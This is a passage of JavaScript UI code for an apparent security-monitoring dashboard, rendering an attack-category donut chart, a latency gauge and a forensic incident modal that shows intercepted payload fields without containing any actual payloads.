    const slices = vectors.map((v) => {
      const startAngle = cumulativePercent * 3.6;
      cumulativePercent += v.percent;
      const endAngle = cumulativePercent * 3.6;

      const startRad = (startAngle - 90) * (Math.PI / 180);
      const endRad = (endAngle - 90) * (Math.PI / 180);

      const x1 = center + radius * Math.cos(startRad);
      const y1 = center + radius * Math.sin(startRad);
      const x2 = center + radius * Math.cos(endRad);
      const y2 = center + radius * Math.sin(endRad);

      const largeArc = v.percent > 50 ? 1 : 0;
      const pathData = `M ${x1} ${y1} A ${radius} ${radius} 0 ${largeArc} 1 ${x2} ${y2}`;

      return {
        ...v,
        pathData,
        isHovered: hoveredSlice === v.category
      };
    });

    return h('div', { className: 'sg-donut-svg-container' },
      h('svg', { width: size, height: size, viewBox: `0 0 ${size} ${size}` },
        h('circle', {
          cx: center,
          cy: center,
          r: radius,
          fill: 'none',
          stroke: 'rgba(255, 255, 255, 0.05)',
          strokeWidth: strokeWidth
        }),

        slices.map((slice) =>
          h('path', {
            key: slice.category,
            d: slice.pathData,
            fill: 'none',
            stroke: slice.color,
            strokeWidth: slice.isHovered ? strokeWidth + 4 : strokeWidth,
            strokeLinecap: 'butt',
            style: {
              cursor: 'pointer',
              transition: 'all 0.2s ease',
              filter: slice.isHovered ? `drop-shadow(0 0 6px ${slice.color})` : 'none'
            },
            onMouseEnter: () => onHoverSlice(slice.category),
            onMouseLeave: () => onHoverSlice(null),
            onClick: () => onSelectCategory(slice.category)
          })
        )
      ),

      h('div', { className: 'sg-donut-center-text' },
        h('div', { className: 'sg-donut-center-num' },
          hoveredSlice ? `${vectors.find(v => v.category === hoveredSlice)?.percent}%` : totalCount.toLocaleString()
        ),
        h('div', { className: 'sg-donut-center-lbl' },
          hoveredSlice ? hoveredSlice : 'TOTAL ATTACKS'
        )
      )
    );
  }

  // ===========================================================================
  // 10. SUB-COMPONENT: RADIAL LATENCY GAUGE
  // ===========================================================================
  function RadialLatencyGauge({ value }) {
    const width = 200;
    const height = 120;
    const cx = 100;
    const cy = 105;
    const r = 74;
    const strokeWidth = 14;

    const maxVal = 6.0;
    const normalized = Math.min(Math.max(value / maxVal, 0), 1);

    const angle = Math.PI - normalized * Math.PI;
    const needleX = cx + r * Math.cos(angle);
    const needleY = cy - r * Math.sin(angle);

    const trackPath = `M ${cx - r} ${cy} A ${r} ${r} 0 0 1 ${cx + r} ${cy}`;
    const fillPath = `M ${cx - r} ${cy} A ${r} ${r} 0 0 1 ${needleX} ${needleY}`;

    const gaugeColor = value <= 2.0 ? '#3FB950' : (value <= 4.5 ? '#F59E0B' : '#F85149');

    return h('div', { className: 'sg-gauge-svg-wrap' },
      h('svg', { width: width, height: height, viewBox: `0 0 ${width} ${height}` },
        h('path', {
          d: trackPath,
          fill: 'none',
          stroke: 'rgba(255, 255, 255, 0.08)',
          strokeWidth: strokeWidth,
          strokeLinecap: 'round'
        }),

        h('path', {
          d: fillPath,
          fill: 'none',
          stroke: gaugeColor,
          strokeWidth: strokeWidth,
          strokeLinecap: 'round',
          style: { transition: 'stroke 0.3s ease' }
        }),

        h('g', null,
          h('circle', {
            cx: cx + r * Math.cos(Math.PI - (5.0 / 6.0) * Math.PI),
            cy: cy - r * Math.sin(Math.PI - (5.0 / 6.0) * Math.PI),
            r: 3,
            fill: '#F85149'
          })
        ),

        h('circle', {
          cx: needleX,
          cy: needleY,
          r: 6,
          fill: '#FFFFFF',
          stroke: gaugeColor,
          strokeWidth: 2,
          style: { filter: `drop-shadow(0 0 6px ${gaugeColor})`, transition: 'all 0.3s ease' }
        })
      ),

      h('div', { className: 'sg-gauge-digital-readout' },
        h('div', { className: 'sg-gauge-num' }, `${value.toFixed(2)} ms`),
        h('div', { className: 'sg-gauge-lbl' }, 'P99 Real-Time Latency')
      )
    );
  }

  // ===========================================================================
  // 11. SUB-COMPONENT: FORENSIC PAYLOAD MODAL
  // ===========================================================================
  function ForensicPayloadModal({ incident, onClose, onCopy, isCopied }) {
    if (!incident) return null;

    return h('div', { className: 'sg-forensic-modal-overlay', onClick: onClose },
      h('div', { className: 'sg-glass-card sg-forensic-modal-card', onClick: (e) => e.stopPropagation() },
        h('div', { style: { display: 'flex', justifyContent: 'space-between', alignItems: 'center', borderBottom: '1px solid var(--stone-border)', paddingBottom: '14px', marginBottom: '16px' } },
          h('div', null,
            h('div', { style: { fontSize: '11px', fontFamily: 'var(--font-mono)', color: 'var(--text-muted)' } },
              `INCIDENT FORENSIC DOSSIER // ${incident.id}`
            ),
            h('h3', { style: { margin: '4px 0 0 0', fontSize: '16px', fontWeight: '800', color: 'var(--text-charcoal)' } },
              `${incident.category}: ${incident.rule}`
            )
          ),
          h('button', {
            className: 'btn btn-subtle',
            style: { padding: '4px 8px' },
            onClick: onClose,
            'aria-label': 'Close modal'
          }, h(Icons.Close, { size: 16 }))
        ),

        h('div', { style: { display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(180px, 1fr))', gap: '10px', marginBottom: '16px' } },
          h('div', { style: { background: 'var(--sand-warm)', padding: '10px', borderRadius: 'var(--radius-xs)' } },
            h('div', { style: { fontSize: '9px', fontFamily: 'var(--font-mono)', color: 'var(--text-muted)' } }, 'ATTACK TIME'),
            h('div', { style: { fontSize: '12px', fontWeight: '700', fontFamily: 'var(--font-mono)' } }, incident.timestamp)
          ),
          h('div', { style: { background: 'var(--sand-warm)', padding: '10px', borderRadius: 'var(--radius-xs)' } },
            h('div', { style: { fontSize: '9px', fontFamily: 'var(--font-mono)', color: 'var(--text-muted)' } }, 'ADVERSARY IP & GEO'),
            h('div', { style: { fontSize: '12px', fontWeight: '700', fontFamily: 'var(--font-mono)' } }, `${incident.clientIp} (${incident.geo})`)
          ),
          h('div', { style: { background: 'var(--sand-warm)', padding: '10px', borderRadius: 'var(--radius-xs)' } },
            h('div', { style: { fontSize: '9px', fontFamily: 'var(--font-mono)', color: 'var(--text-muted)' } }, 'RISK CLASSIFICATION'),
            h('div', { style: { fontSize: '12px', fontWeight: '800', color: 'var(--terracotta)', fontFamily: 'var(--font-mono)' } },
              `${incident.riskScore}/100 (${incident.severity})`
            )
          ),
          h('div', { style: { background: 'var(--sand-warm)', padding: '10px', borderRadius: 'var(--radius-xs)' } },
            h('div', { style: { fontSize: '9px', fontFamily: 'var(--font-mono)', color: 'var(--text-muted)' } }, 'VERDICT'),
            h('div', { style: { fontSize: '11px', fontWeight: '700', color: 'var(--terracotta)', fontFamily: 'var(--font-mono)' } }, incident.verdict)
          )
        ),

        // Decoded Malicious Payload
        h('div', { style: { marginBottom: '16px' } },
          h('div', { style: { display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '6px' } },
            h('span', { style: { fontSize: '11px', fontWeight: '800', fontFamily: 'var(--font-mono)', color: 'var(--text-muted)' } },
              'INTERCEPTED PAYLOAD (RAW WIRE WIRE-TAP):'
            ),
            h('button', {
              className: `sg-copy-btn ${isCopied ? 'copied' : ''}`,
              onClick: () => onCopy(incident.id, incident.payload)
            },
              isCopied ? h(Icons.Check, { size: 12 }) : h(Icons.Copy, { size: 12 }),
              isCopied ? 'COPIED ✓' : 'Copy Payload'
            )
          ),
          h('pre', {
            style: {
              background: 'rgba(0, 0, 0, 0.45)',
              border: '1px solid var(--stone-border)',
              borderRadius: 'var(--radius-sm)',
              padding: '12px',
              fontFamily: 'var(--font-mono)',
              fontSize: '11.5px',
              color: 'var(--warm-ochre)',
              whiteSpace: 'pre-wrap',
              wordBreak: 'break-all',
              margin: 0
            }
          }, incident.payload)
        ),

        // Raw Wire Hex Dump Preview
        h('div', { style: { marginBottom: '16px' } },
          h('span', { style: { fontSize: '11px', fontWeight: '800', fontFamily: 'var(--font-mono)', color: 'var(--text-muted)' } },
            'RAW INGRESS PACKET HEX DUMP (L7 ZERO-COPY MEMORY SLICE):'
          ),
          h('div', { className: 'sg-hex-dump-box', style: { marginTop: '6px' } },
            incident.rawHex || "47 45 54 20 2F 61 70 69 20 48 54 54 50 2F 31 2E 31 0D 0A"
          )
        ),

        // AST Lexical Tokens
        h('div', { style: { marginBottom: '16px' } },
          h('span', { style: { fontSize: '11px', fontWeight: '800', fontFamily: 'var(--font-mono)', color: 'var(--text-muted)' } },
            'PARSED AST LEXICAL TOKENS (ZERO-BYPASS DFA MATCH):'
          ),
          h('div', { className: 'sg-token-grid' },
            incident.astTokens.map((tok, i) =>
              h('span', { key: i, className: 'sg-token-chip' }, tok)
            )
          )
        ),

        // Origin Cryptographic Ed25519 Seal
        h('div', { style: { background: 'var(--sand-warm)', padding: '10px 14px', borderRadius: 'var(--radius-sm)', border: '1px solid var(--stone-border)', marginBottom: '18px' } },
          h('div', { style: { fontSize: '9px', fontFamily: 'var(--font-mono)', color: 'var(--text-muted)' } },
            'CRYPTOGRAPHIC ORIGIN SEAL (RFC 8032 ED25519 SIGNATURE)'
          ),
          h('div', { style: { fontSize: '11px', fontFamily: 'var(--font-mono)', color: 'var(--deep-indigo)', wordBreak: 'break-all', marginTop: '3px' } },
            incident.seal
          )
        ),

        h('div', { style: { display: 'flex', justifyContent: 'flex-end', gap: '10px' } },
          h('button', {
            className: 'btn btn-subtle',
            onClick: onClose
          }, 'Close Dossier')
        )
      )
    );
  }

  // ===========================================================================
  // 12. ROOT MOUNT CONTROLLER
  // ===========================================================================
  let reactRootInstance = null;

  window.initReactAnalytics = function () {
    const container = document.getElementById('react-analytics-root');
    if (!container) return;

    if (window.ReactDOM && window.ReactDOM.createRoot) {
      if (!reactRootInstance) {
        reactRootInstance = window.ReactDOM.createRoot(container);
      }
      reactRootInstance.render(h(ModernAnalyticsDashboard));
    } else if (window.ReactDOM && window.ReactDOM.render) {
      window.ReactDOM.render(h(ModernAnalyticsDashboard), container);
    } else {
      setTimeout(window.initReactAnalytics, 200);
    }
  };

  if (document.readyState === 'complete' || document.readyState === 'interactive') {
    setTimeout(window.initReactAnalytics, 50);
  } else {
    document.addEventListener('DOMContentLoaded', () => setTimeout(window.initReactAnalytics, 50));
  }

})();
